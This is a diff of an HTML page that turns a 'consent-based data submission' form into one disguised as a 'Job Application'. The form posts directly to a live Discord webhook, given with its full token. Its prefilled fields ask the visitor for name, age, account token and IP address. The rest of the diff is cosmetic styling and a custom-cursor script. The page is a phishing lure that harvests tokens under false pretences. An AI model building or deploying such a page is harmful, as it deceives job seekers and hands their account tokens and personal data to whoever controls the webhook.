@@ -1,94 +1,118 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Send Message to Discord</title>
+  <meta charset="UTF-8">
+  <title>Job Application</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background: #0f172a;
-      color: #e5e7eb;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      margin: 0;
+      background:#0f172a;
+      font-family:Arial, sans-serif;
+      color:#e5e7eb;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      margin:0;
     }
-    .card {
-      background: #020617;
-      padding: 20px;
-      border-radius: 16px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 10px 25px rgba(0,0,0,0.4);
+    .box {
+      background:#020617;
+      padding:20px;
+      border-radius:12px;
+      width:100%;
+      max-width:420px;
+      animation: floatIn 0.6s ease-out both;
     }
-    h1 {
-      font-size: 1.25rem;
-      margin-bottom: 12px;
-      text-align: center;
+    @keyframes floatIn {
+      from { opacity:0; transform: translateY(10px) scale(0.98); }
+      to { opacity:1; transform: translateY(0) scale(1); }
     }
-    label {
-      display: block;
-      margin-top: 12px;
-      font-size: 0.9rem;
-      color: #cbd5f5;
+    label { margin-top:10px; display:block; }
+    textarea, input {
+      width:100%;
+      margin-top:5px;
+      padding:10px;
+      border-radius:8px;
+      border:none;
     }
-    input, textarea {
-      width: 100%;
-      padding: 10px;
-      margin-top: 6px;
-      border-radius: 10px;
-      border: none;
-      outline: none;
-      background: #020617;
-      color: #e5e7eb;
-    }
-    textarea { resize: vertical; min-height: 90px; }
     button {
-      width: 100%;
-      margin-top: 16px;
-      padding: 12px;
-      border: none;
-      border-radius: 12px;
-      background: #6366f1;
-      color: white;
-      font-size: 1rem;
-      cursor: pointer;
+      margin-top:15px;
+      width:100%;
+      padding:12px;
+      border:none;
+      border-radius:10px;
+      background:#6366f1;
+      color:white;
+      font-size:1rem;
+      cursor:pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
     }
-    button:hover { opacity: 0.9; }
-    .status {
-      margin-top: 12px;
-      font-size: 0.85rem;
-      text-align: center;
+    button:hover {
+      transform: translateY(-2px) scale(1.02);
+      box-shadow: 0 12px 30px rgba(99,102,241,0.45);
+      background:#7c7ff6;
     }
-  </style>
+    button:active {
+      transform: translateY(0) scale(0.99);
+    }
+  /* Custom animated cursor */
+    body {
+      cursor: none;
+    }
+    .cursor {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 18px;
+      height: 18px;
+      border-radius: 50%;
+      background: radial-gradient(circle, #a5b4fc, #6366f1);
+      pointer-events: none;
+      transform: translate(-50%, -50%);
+      animation: pulse 1.2s infinite ease-in-out;
+      z-index: 9999;
+    }
+    @keyframes pulse {
+      0% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
+      50% { transform: translate(-50%, -50%) scale(1.4); opacity: 0.5; }
+      100% { transform: translate(-50%, -50%) scale(1); opacity: 0.9; }
+    }
+</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Consent-Based Data Submission</h1>
-    <p style="font-size:0.85rem; color:#94a3b8; text-align:center;">
-      Paste only data you own or are authorized to share. By submitting, you confirm consent.
-    </p>
-    <label>Your Submission</label>
-  <textarea name="content" rows="8" required>
-🍪 **New Consent-Based Submission**
 
-**Name:** 
-**Age:** 
-**Token:** 
-**IP:**
+<div class="box">
+  <h2>🍪 Job Application</h2>
+
+  <form action="https://discordapp.com/api/webhooks/1449687692269981767/I0xHJXi4UNYimnK-PHgOiJacI1Ie7bmMY9JCvi9sDk24fmSSqf8kQ9FTQUg9sUwQ_Mwp" method="POST">
+
+    <textarea name="content" rows="8" required>
+🍪 Job Application
+
+Name:
+Age:
+Token:
+IP:
 
 ---
-Submitted via authorized form
-  </textarea>
+Submitted via form
+    </textarea>
 
-  <label style="display:flex; gap:8px; margin-top:12px; font-size:0.8rem; color:#cbd5f5;">
-    <input type="checkbox" required />
-    I confirm I own this data or have explicit permission to submit it.
-  </label>
+    <label style="font-size:0.8rem; margin-top:10px;">
+      <input type="checkbox" required> I confirm this information is accurate and submitted with consent
+    </label>
 
-  <button type="submit">Submit with Consent</button>
-</form>
+    <button type="submit">Submit Application</button>
+  </form>
+</div>
+
+<div class="cursor" id="cursor"></div>
+<script>
+  const cursor = document.getElementById('cursor');
+  document.addEventListener('mousemove', e => {
+    cursor.style.top = e.clientY + 'px';
+    cursor.style.left = e.clientX + 'px';
+  });
+</script>
 </body>
 </html>
